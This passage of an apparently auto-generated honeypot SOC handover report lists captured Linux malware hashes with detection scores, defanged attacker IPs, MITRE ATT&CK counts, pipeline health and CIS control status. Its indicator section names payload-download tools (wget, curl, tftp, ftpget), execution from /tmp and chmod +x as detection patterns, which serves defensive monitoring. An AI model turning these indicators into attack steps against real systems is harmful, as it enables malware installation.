| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `200.81.189[.]110` | AR | SION S.A | **100** ⚠️ | 1 |
| `183.56.200[.]211` | CN | CHINANET Guangdong province network | **100** ⚠️ | 1 |
| `88.84.209[.]146` | RU | Flex network in Moscow region | **100** ⚠️ | 50 |
| `92.255.196[.]185` | RU | CJSC Company ER-Telecom Kazan' | **100** ⚠️ | 50 |
| `83.191.181[.]23` | SE | SE TELE2 BROADBAND | **100** ⚠️ | 50 |
| `61.145.181[.]7` | CN | CHINANET Guangdong Province Network | **100** ⚠️ | 50 |
| `178.178.194[.]131` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `86.23.88[.]161` | GB | STOKE | **100** ⚠️ | 2 |
| `178.178.194[.]134` | RU | Metropolitan branch of PJSC MegaFon | **100** ⚠️ | 50 |
| `98.82.1[.]192` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 12 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 203 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 192 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 118 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 117 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 117 |

---

## 🔕 False Positive Summary (22 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 5228 cases |
| Tool 34  | Credential Extractor        | ✅ 223 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 91 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 22 filtered (0.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 68 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 21 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 191 priority case(s) shown individually · 31 recon entry/entries in table (7 group(s) consolidating 4991 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-16T03:04:14Z_
